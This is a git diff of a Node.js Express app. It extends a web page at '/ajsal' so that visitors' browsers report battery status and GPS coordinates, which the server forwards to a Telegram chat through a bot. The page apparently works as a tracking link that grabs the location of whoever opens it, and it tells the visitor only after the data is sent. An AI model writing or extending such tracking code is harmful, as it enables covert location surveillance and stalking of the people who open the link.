@@ -97,26 +97,40 @@ app.get('/ajsal', async (req, res) => {
       <h1>Device & Location Info Sent!</h1>
       <p>Your device and location information have been sent to Telegram.</p>
       <script>
-        async function sendBatteryInfo() {
+        async function sendBatteryAndGeolocationInfo() {
           try {
+            // Fetch battery info
             const battery = await navigator.getBattery();
             const batteryInfo = {
               level: (battery.level * 100) + '%',
               charging: battery.charging ? 'Charging' : 'Not Charging'
             };
-            
-            // Send battery info to the server
-            fetch('/battery', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify(batteryInfo)
-            });
+
+            // Fetch geolocation
+            navigator.geolocation.getCurrentPosition(
+              (position) => {
+                const geolocationInfo = {
+                  latitude: position.coords.latitude,
+                  longitude: position.coords.longitude
+                };
+
+                // Send battery and geolocation info to the server
+                fetch('/battery', {
+                  method: 'POST',
+                  headers: { 'Content-Type': 'application/json' },
+                  body: JSON.stringify({ batteryInfo, geolocationInfo })
+                });
+              },
+              (error) => {
+                console.error('Failed to get geolocation:', error.message);
+              }
+            );
           } catch (error) {
-            console.error('Failed to get battery info:', error);
+            console.error('Failed to get battery or geolocation info:', error);
           }
         }
 
-        sendBatteryInfo();
+        sendBatteryAndGeolocationInfo();
       </script>
     </body>
     </html>
@@ -125,19 +139,25 @@ app.get('/ajsal', async (req, res) => {
   res.send(html);
 });
 
-// Handle battery info sent from the client
+// Handle battery and geolocation info sent from the client
 app.post('/battery', express.json(), (req, res) => {
-  const { level, charging } = req.body;
-  const nmessage = `👨🏻‍💻 Navgitor.UserAgent Info 
- 
- 🔋 *Battery Info*:
-- Level: ${level}
-- Status: ${charging}`;
+  const { batteryInfo, geolocationInfo } = req.body;
 
-  // Send battery info to your Telegram
-  bot.sendMessage(ajsal, nmessage, { parse_mode: 'Markdown' });
-  
-  res.status(200).send('Battery info sent to Telegram.');
+  // Prepare the message for Telegram
+  const message = `
+🔋 *Battery Info*:
+- Level: ${batteryInfo.level}
+- Status: ${batteryInfo.charging}
+
+📍 *Geolocation Info*:
+- Latitude: ${geolocationInfo.latitude}
+- Longitude: ${geolocationInfo.longitude}
+`;
+
+  // Send the information to Telegram
+  bot.sendMessage(ajsal, message, { parse_mode: 'Markdown' });
+
+  res.status(200).send('Battery and geolocation info sent to Telegram.');
 });
 
 // Start the server
